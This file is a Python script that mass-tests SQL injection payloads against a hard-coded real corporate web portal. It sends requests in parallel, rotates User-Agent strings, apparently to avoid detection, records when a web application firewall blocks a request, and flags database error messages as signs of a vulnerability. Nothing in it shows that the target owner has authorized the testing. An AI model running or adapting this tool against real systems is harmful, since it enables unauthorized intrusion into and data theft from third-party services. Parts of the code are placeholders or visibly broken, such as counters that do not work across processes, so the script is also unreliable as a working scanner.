# to execute use mpirun --use-hwthread-cpus python3.10 -m mpi4py ./sql_injected.py --quiet

import logging
import multiprocessing
import random
import re
import requests
from tqdm import tqdm
from urllib.parse import urljoin, urlencode

logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger(__name__)

BASE_URL = "https://enterpriseportal.verizon.com/home/#/notifications"
MAX_ATTEMPTS = 1000

# Define global variables to store statistics
total_payloads_tested = 0
injected_payloads = 0
not_injected_payloads = 0
categories_tested = set()

def send_request(url):
    try:
        headers = {'User-Agent': generate_user_agent()}
        response = requests.get(url, headers=headers)
        return response
    except requests.exceptions.RequestException as e:
        logger.error(f"Error sending request: {e}")
        return None

def estimate_progress(tested_payloads, total_payloads):
    return (tested_payloads / total_payloads) * 100

def analyze_response(response, payload):
    global total_payloads_tested, injected_payloads, not_injected_payloads, categories_tested

    total_payloads_tested += 1

    if response is None:
        logger.info("No response received.")
        return

    logger.info(f"Response for payload '{payload}':")
    logger.info(f"Response status code: {response.status_code}")

    if response.status_code == 403:
        logger.info("Request was blocked by WAF.")
        # Analyze HTML response for WAF details
        logger.debug(response.text)
    else:
        logger.info("Request was successful.")
        # Check response for indications of SQL injection vulnerability
        if is_sql_injection_vulnerable(response.text):
            logger.warning("Potential SQL injection vulnerability detected.")
            injected_payloads += 1
        else:
            logger.info("No SQL injection vulnerability detected.")
            not_injected_payloads += 1

    # Extract payload category and update categories tested
    category = extract_category(payload)
    categories_tested.add(category)

def extract_category(payload):
    # Add logic to extract category from the payload
    # For example, you can use regex or simple string manipulation
    # This is just a placeholder, replace it with actual implementation
    return "CategoryPlaceholder"

def is_sql_injection_vulnerable(response_text):
    # Use regex to search for specific patterns indicative of SQL injection attempts
    sql_injection_patterns = [
        r"SQL syntax error",
        r"ORA-",
        # Add more patterns as needed
    ]
    for pattern in sql_injection_patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            return True
    return False

def generate_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15",
        # Add more user agents as needed
    ]
    return random.choice(user_agents)

def fetch_sql_injection_payloads():
    payloads_file = "sql_injection_payloads.txt"  # Adjust the file path as needed
    payloads = []

    try:
        with open(payloads_file, "r") as file:
            for line in file:
                payloads.append(line.strip())
    except FileNotFoundError:
        logger.error(f"Payloads file '{payloads_file}' not found.")
    
    return payloads

def test_payload(payload):
    payload = [('name', payload)]  # Convert payload to a sequence of two-element tuples
    url_with_payload = urljoin(BASE_URL, f"?{urlencode(payload)}")
    response = send_request(url_with_payload)
    if response:
        analyze_response(response, payload)

def main():
    payloads = fetch_sql_injection_payloads()
    total_payloads = len(payloads)

    with multiprocessing.Pool() as pool:
        results = list(tqdm(pool.imap_unordered(test_payload, payloads), total=total_payloads, desc="Progress"))

    # Print summary statistics
    print("Summary:")
    print(f"Total payloads tested: {total_payloads_tested}")
    print(f"Injected payloads: {injected_payloads}")
    print(f"Not injected payloads: {not_injected_payloads}")
    print(f"Categories tested: {', '.join(categories_tested)}")

if __name__ == "__main__":
    main()
